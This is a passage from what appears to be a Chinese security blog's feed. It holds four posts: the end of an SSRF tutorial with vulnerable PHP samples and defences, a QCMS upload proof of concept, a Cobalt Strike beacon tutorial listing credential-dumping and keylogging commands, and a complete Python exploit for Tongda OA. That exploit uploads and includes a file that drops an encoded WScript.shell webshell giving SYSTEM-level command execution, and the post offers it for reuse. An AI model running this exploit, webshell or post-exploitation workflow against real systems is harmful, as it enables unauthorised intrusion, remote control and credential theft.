127.0.0.1</span><br></pre></td></tr></table></figure><h4 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h4><p><strong>1.限制为<a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名</strong><br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br><strong>2.限制请求IP不为内网地址</strong><br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br><strong>3.限制请求只为http协议</strong><br>（1）采取302跳转<br>（2）采取短地址</p><h1 id="0x07-审计php常见的函数"><a href="#0x07-审计php常见的函数" class="headerlink" title="0x07 审计php常见的函数"></a>0x07 审计php常见的函数</h1><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><p>（1）file_get_contents() 函数从用户指定的url获取内容，并展示给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（2）fsockopen()</p><p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) &#123; </span><br><span class="line">    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);   </span><br><span class="line">    if (!$fp) &#123; </span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Host: $host\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;\r\n&quot;; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents&#x3D;&#39;&#39;; </span><br><span class="line">        while (!feof($fp)) &#123; </span><br><span class="line">            $contents.&#x3D; fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（3）curl_exec() 函数用于执行指定的cURL会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#39;url&#39;]))&#123;</span><br><span class="line">    $link &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">    $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项</span><br><span class="line">    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器</span><br><span class="line">    curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="0x08防御技术"><a href="#0x08防御技术" class="headerlink" title="0x08防御技术"></a>0x08防御技术</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br>2、统一错误信息，防止根据错误信息判断端口状态<br>3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br>4、设置URL白名单或者限制内网IP</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2115#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115#toc-2</a></p><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA前台RCE加EXP任意文件上传+文件包含</title>
      <link href="/2020/03/18/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0RCE%E5%8A%A0EXP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/03/18/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0RCE%E5%8A%A0EXP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>RCE思路如下：未授权上传文件（jpg）-&gt;php代码包含-&gt;rce<br>理论上是通杀，但是貌似2015版没有包含功能<br>大家可以复现了</p><p><img src="https://img-blog.csdnimg.cn/20200318165233465.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义webshell，因为是包含，所以用写入马比较方便</span></span><br><span class="line"><span class="comment"># 这个马自带bypass disable_function 功能</span></span><br><span class="line">shell = <span class="string">'''&lt;?php</span></span><br><span class="line"><span class="string">$fp = fopen('poc.php', 'w+');</span></span><br><span class="line"><span class="string">$a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==");</span></span><br><span class="line"><span class="string">fwrite($fp, urldecode($a));</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入目标</span></span><br><span class="line">url = input(<span class="string">"input the TARGET(example:[url]https://127.0.0.1:1080[/url])&gt;"</span>)</span><br><span class="line"><span class="comment"># 定义上传目录和包含目录</span></span><br><span class="line">upload_url = url+<span class="string">"/ispirit/im/upload.php"</span></span><br><span class="line">include_url = url+<span class="string">"/ispirit/interface/gateway.php"</span></span><br><span class="line"><span class="comment"># 定义shell目录，如果要修改名字，需要把shell里面的一起改了</span></span><br><span class="line">shell_url = url+<span class="string">"/ispirit/interface/poc.php"</span></span><br><span class="line">files = &#123;<span class="string">'ATTACHMENT'</span>: shell&#125;</span><br><span class="line"><span class="comment"># 参见源码，有漏洞的版本只要POST P和DEST_UID参数就会自动生成session</span></span><br><span class="line">upload_data = &#123;<span class="string">"P"</span>: <span class="string">"123"</span>, <span class="string">"DEST_UID"</span>: <span class="string">"1"</span>, <span class="string">"UPLOAD_MODE"</span>: <span class="string">"2"</span>&#125;</span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line">upload_res = requests.post(upload_url, upload_data, files=files)</span><br><span class="line"><span class="comment"># 此时会返回上传文件的路径</span></span><br><span class="line">path = upload_res.text</span><br><span class="line"><span class="comment"># 解析返回值获取上传地址</span></span><br><span class="line">path = path[path.find(<span class="string">'@'</span>)+<span class="number">1</span>:path.rfind(<span class="string">'|'</span>)</span><br><span class="line">            ].replace(<span class="string">"_"</span>, <span class="string">"\/"</span>).replace(<span class="string">"|"</span>, <span class="string">"."</span>)</span><br><span class="line"><span class="comment"># 由于上传文件会自动改为jpg，所以要用gateway.php包含</span></span><br><span class="line">include_data = &#123;<span class="string">"json"</span>: <span class="string">"&#123;\"url\":\"/general/../../attach/im/"</span> + path+<span class="string">"\"&#125;"</span>&#125;</span><br><span class="line"><span class="comment"># 包含+自动写入shell</span></span><br><span class="line">include_res = requests.post(include_url, data=include_data)</span><br><span class="line"><span class="comment"># 返回结果 a参数可以直接填入系统命令（比如whoami），默认是system权限</span></span><br><span class="line">print(<span class="string">'shell is here:'</span>+shell_url+<span class="string">'?a=command'</span>)</span><br></pre></td></tr></table></figure><p>转自：<a href="https://www.t00ls.net/thread-55458-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55458-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QCMS v3.01 has Unrestricted Upload vulnerability</title>
      <link href="/2020/03/16/QCMS%20v3.01%20has%20Unrestricted%20Upload%20vulnerability/"/>
      <url>/2020/03/16/QCMS%20v3.01%20has%20Unrestricted%20Upload%20vulnerability/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>– Title: QCMS v3.01 has Unrestricted Upload vulnerability</p><p>– Date: 2020-01-28<br>– Exploit Author: zeo<br>– Official download address of QCMS: <a href="http://www.q-cms.cn/" target="_blank" rel="noopener">http://www.q-cms.cn/</a><br>– The latest version I tested should be version 3.0.1 according to the official website description<br>– Version: v3.01<br>– Tested on Windows 7</p><p>– QCMS v3.01 allows Unrestricted Upload of a File with a Dangerous Types to /backend/system.php</p><p>– The vulnerable code is located in</p><p>Lib-&gt;Config-&gt;Controllers.php-&gt;public function upload($file_arr = array()){<br><img src="https://img-blog.csdnimg.cn/20200316220247224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Not to upload types for effective detection, lead to upload any file, can be directly getshell</p><p>– Proof of  Unrestricted Upload:</p><p>1.login QCMS<br>The default  user and password：admin admin<br><a href="http://127.0.0.1/admin/" target="_blank" rel="noopener">http://127.0.0.1/admin/</a><br><img src="https://img-blog.csdnimg.cn/20200316215743363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 Visit vulnerability url <a href="http://127.0.0.1/backend/system.php" target="_blank" rel="noopener">http://127.0.0.1/backend/system.php</a><br>Click on the upload，Can upload webshell directly<br><img src="https://img-blog.csdnimg.cn/20200316220607942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 Copy the reflection upload address, visit<br><a href="http://127.0.0.1//Static/upload/source/20200316/3415e6f41aae98939.php" target="_blank" rel="noopener">http://127.0.0.1//Static/upload/source/20200316/3415e6f41aae98939.php</a></p><p><img src="https://img-blog.csdnimg.cn/20200316220749583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>successful<br><img src="https://img-blog.csdnimg.cn/2020031622092694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 申请 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用</title>
      <link href="/2020/03/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%BA%8C-Beacon%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/03/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%BA%8C-Beacon%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-神器-Cobalt-Strike2-Beacon简介和使用"><a href="#内网安全学习从入门到入狱-神器-Cobalt-Strike2-Beacon简介和使用" class="headerlink" title="内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用"></a>内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用</h1><h3 id="内网安全学习从入门到入狱-神器-Cobalt-Strike-二-Beacon简介和使用"><a href="#内网安全学习从入门到入狱-神器-Cobalt-Strike-二-Beacon简介和使用" class="headerlink" title="内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用"></a>内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用</h3><ul><li><a href="#Cobalt_Strike2Beacon_1">内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用</a></li><li><ul><li><a href="#0x01PC_18">0x01简单的木马打到一台PC</a></li><li><ul><li><a href="#win_Payload_28">生成win的 Payload</a></li></ul></li><li><a href="#0x02_beacon_50">0x02 beacon的介绍和使用</a></li><li><ul><li><a href="#Beacon_54">Beacon简介</a></li><li><a href="#Beacon_78">Beacon分类：</a></li><li><ul><li><a href="#http_beacon_86">http beacon</a></li><li><a href="#DNS_beacon_90">DNS beacon</a></li><li><a href="#SMB_beacon_106">SMB beacon</a></li></ul></li><li><a href="#beacon_116">进入beacon</a></li><li><a href="#_226">简单的命令执行</a></li><li><a href="#_252">最常用的修改心跳包</a></li></ul></li></ul></li></ul><p><a href="https://blog.csdn.net/god_zzZ/article/details/104690519" target="_blank" rel="noopener">内网安全学习从入门到入狱-工具-Cobalt Strike(cs)基础</a></p><p>上一次Cobalt Strike写到简单的介绍和启动服务和打开</p><ul><li>这一次我们写简单的木马生成以便介绍后续的功能</li><li>介绍一下beacon的作用和一下常用的操作</li></ul><h2 id="0x01简单的木马打到一台PC"><a href="#0x01简单的木马打到一台PC" class="headerlink" title="0x01简单的木马打到一台PC"></a>0x01简单的木马打到一台PC</h2><p>我们得有一个机子才能做后续的实验吧，所以</p><p>这算是获得了一个入口的机器</p><p>这才是一台win7来介绍一下beacon</p><h3 id="生成win的-Payload"><a href="#生成win的-Payload" class="headerlink" title="生成win的 Payload"></a>生成win的 Payload</h3><p>1、attacks-packages-Windows excutable</p><p><img src="https://img-blog.csdnimg.cn/20200315184828350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2、点击ADD，增加一个监听器</p><p><img src="https://img-blog.csdnimg.cn/20200315185334141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3、name随便写，host写服务器地址默认，端口自己定</p><p><img src="https://img-blog.csdnimg.cn/20200315185322120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4、点击save，出现一个exe，自己放到win7里面运行一下</p><p>5、主机上线</p><p><img src="https://img-blog.csdnimg.cn/20200315185436213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-beacon的介绍和使用"><a href="#0x02-beacon的介绍和使用" class="headerlink" title="0x02 beacon的介绍和使用"></a>0x02 beacon的介绍和使用</h2><h3 id="Beacon简介"><a href="#Beacon简介" class="headerlink" title="Beacon简介"></a>Beacon简介</h3><ul><li>那个作者说Beacon是Cobalt Strike运行在目标主机上的payload</li><li>翻译过来是叫信标，我觉得这个好理解</li><li>Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机**。**</li><li>它的工作方式与Metasploit Framework Payload类似</li><li>Beacon嵌入到可执行文件、添加到Word文档和一些漏洞 来传递Beacon</li></ul><p>执行我们的Payload后，即可发现目标机已经上线</p><blockquote><p><strong>Beacon有两种通信策略</strong>（与团队服务器通信-CS 中以团队服务器作为 C2）</p><ol><li><p><strong>异步式通信</strong> = 异步模式下通信频率低、速度慢，如上图所示：Beacon会主动请求任务列表、然后进入SLEEP状态。</p></li><li><p><strong>交互式通信</strong> = C2 对 Beacon 实时控制</p></li></ol></blockquote><h3 id="Beacon分类："><a href="#Beacon分类：" class="headerlink" title="Beacon分类："></a>Beacon分类：</h3><ol><li><p>HTTP and HTTPS Beacon</p></li><li><p>DNS Beacon</p></li><li><p>SMB Beacon</p></li></ol><h4 id="http-beacon"><a href="#http-beacon" class="headerlink" title="http beacon"></a>http beacon</h4><p>这个应该最简单，关键是Beacon通过GET请求来下载任务</p><h4 id="DNS-beacon"><a href="#DNS-beacon" class="headerlink" title="DNS beacon"></a>DNS beacon</h4><p>DNS Beacon在绕过防火墙 权限维持上非常有效</p><p>下面是主要流程，简单来说，就是靠dns解析找到你</p><p>整个配置过程非常简单，一条A记录和几条NS记录即可</p><p>配置A记录指向服务器ip ns记录都指向A记录域名</p><p><img src="https://img-blog.csdnimg.cn/20200315185456824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><h4 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h4><p>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</p><p>派生一个SMB Beacon方法：</p><p>在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn as&gt;选中对应的Listener&gt;上线</p><p>或在Beacon中使用命令<code>spawn 监听器</code></p><h3 id="进入beacon"><a href="#进入beacon" class="headerlink" title="进入beacon"></a>进入beacon</h3><p>1、右键目标interact来使用Beacon，我们用它来执行各种命令</p><p><img src="https://img-blog.csdnimg.cn/20200315185512688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>2、下放输入help 查看功能</p><p>Beacon中输入help来获取。</p><p><img src="https://img-blog.csdnimg.cn/20200315185620320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在这贴出一部分汉化的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line"> Command Description</span><br><span class="line"> ------- -----------</span><br><span class="line"> browserpivot 注入受害者浏览器进程</span><br><span class="line"> bypassuac 绕过UAC</span><br><span class="line"> cancel 取消正在进行的下载</span><br><span class="line"> cd 切换目录</span><br><span class="line"> checkin 强制让被控端回连一次</span><br><span class="line"> clear 清除beacon内部的任务队列</span><br><span class="line"> connect Connect to a Beacon peer over TCP</span><br><span class="line"> covertvpn 部署Covert VPN客户端</span><br><span class="line"> cp 复制文件</span><br><span class="line"> dcsync 从DC中提取密码哈希</span><br><span class="line"> desktop 远程VNC</span><br><span class="line"> dllinject 反射DLL注入进程</span><br><span class="line"> dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line"> download 下载文件</span><br><span class="line"> downloads 列出正在进行的文件下载</span><br><span class="line"> drives 列出目标盘符</span><br><span class="line"> elevate 尝试提权</span><br><span class="line"> execute 在目标上执行程序(无输出)</span><br><span class="line"> execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line"> exit 退出beacon</span><br><span class="line"> getprivs Enable system privileges on current token</span><br><span class="line"> getsystem 尝试获取SYSTEM权限</span><br><span class="line"> getuid 获取用户ID</span><br><span class="line"> hashdump 转储密码哈希值</span><br><span class="line"> help 帮助</span><br><span class="line"> inject 在特定进程中生成会话</span><br><span class="line"> jobkill 杀死一个后台任务</span><br><span class="line"> jobs 列出后台任务</span><br><span class="line"> kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line"> kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line"> kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line"> keylogger 键盘记录</span><br><span class="line"> kill 结束进程</span><br><span class="line"> link Connect to a Beacon peer over a named pipe</span><br><span class="line"> logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line"> ls 列出文件</span><br><span class="line"> make_token 创建令牌以传递凭据</span><br><span class="line"> mimikatz 运行mimikatz</span><br><span class="line"> mkdir 创建一个目录</span><br><span class="line"> mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line"> mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode http 使用HTTP作为通信通道</span><br><span class="line"> mv 移动文件</span><br><span class="line"> net net命令</span><br><span class="line"> note 备注 </span><br><span class="line"> portscan 进行端口扫描</span><br><span class="line"> powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line"> powershell 通过powershell.exe执行命令</span><br><span class="line"> powershell-import 导入powershell脚本</span><br><span class="line"> ppid Set parent PID for spawned post-ex jobs</span><br><span class="line"> ps 显示进程列表</span><br><span class="line"> p**ec Use a service to spawn a session on a host</span><br><span class="line"> p**ec_psh Use PowerShell to spawn a session on a host</span><br><span class="line"> psinject 在特定进程中执行PowerShell命令</span><br><span class="line"> pth 使用Mimikatz进行传递哈希</span><br><span class="line"> pwd 当前目录位置</span><br><span class="line"> reg Query the registry</span><br><span class="line"> rev2self 恢复原始令牌</span><br><span class="line"> rm 删除文件或文件夹</span><br><span class="line"> rportfwd 端口转发</span><br><span class="line"> run 在目标上执行程序(返回输出)</span><br><span class="line"> runas 以另一个用户权限执行程序</span><br><span class="line"> runasadmin 在高权限下执行程序</span><br><span class="line"> runu Execute a program under another PID</span><br><span class="line"> screenshot 屏幕截图</span><br><span class="line"> setenv 设置环境变量</span><br><span class="line"> shell cmd执行命令</span><br><span class="line"> shinject 将shellcode注入进程</span><br><span class="line"> shspawn 生成进程并将shellcode注入其中</span><br><span class="line"> sleep 设置睡眠延迟时间</span><br><span class="line"> socks 启动SOCKS4代理</span><br><span class="line"> socks stop 停止SOCKS4</span><br><span class="line"> spawn Spawn a session </span><br><span class="line"> spawnas Spawn a session as another user</span><br><span class="line"> spawnto Set executable to spawn processes into</span><br><span class="line"> spawnu Spawn a session under another PID</span><br><span class="line"> ssh 使用ssh连接远程主机</span><br><span class="line"> ssh-key 使用密钥连接远程主机</span><br><span class="line"> steal_token 从进程中窃取令牌</span><br><span class="line"> timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line"> unlink Disconnect from parent Beacon</span><br><span class="line"> upload 上传文件</span><br><span class="line"> wdigest 使用mimikatz转储明文凭据</span><br><span class="line"> winrm 使用WinRM在主机上生成会话</span><br><span class="line"> wmi 使用WMI在主机上生成会话</span><br><span class="line"> argue 进程参数欺骗</span><br></pre></td></tr></table></figure><h3 id="简单的命令执行"><a href="#简单的命令执行" class="headerlink" title="简单的命令执行"></a>简单的命令执行</h3><p>Beacon中不能直接输入cmd命令，</p><p>如果让目标机执行ipconfig这条cmd命令，对应的Beacon命令是 <code>shell ipconfig</code></p><p>回显的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell +command</span><br></pre></td></tr></table></figure><p>当前目录路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><p>使用powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell +command</span><br></pre></td></tr></table></figure><h3 id="最常用的修改心跳包"><a href="#最常用的修改心跳包" class="headerlink" title="最常用的修改心跳包"></a>最常用的修改心跳包</h3><ul><li>在Cobalt 